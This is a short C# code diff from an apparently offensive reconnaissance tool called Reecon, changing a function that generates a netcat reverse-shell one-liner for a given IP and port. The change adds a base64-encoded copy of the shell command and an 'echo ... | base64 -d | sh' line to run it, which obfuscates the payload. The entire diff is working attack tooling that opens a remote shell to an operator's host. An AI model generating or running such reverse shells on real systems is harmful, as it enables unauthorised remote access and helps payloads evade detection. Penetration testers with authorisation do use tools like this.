@@ -220,7 +220,12 @@ namespace Reecon
         private static string SHShell(string ip, string port)
         {
             // Currently just the nc shell - Need one without it...
-            return $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
+            string shell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
+            string base64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(shell));
+            string toReturn = "Base: " + shell + Environment.NewLine +
+                              "Base64: " + base64Shell + Environment.NewLine +
+                              "-> echo " + base64Shell + " | base64 -d | sh";
+            return toReturn;
         }
     }
 }
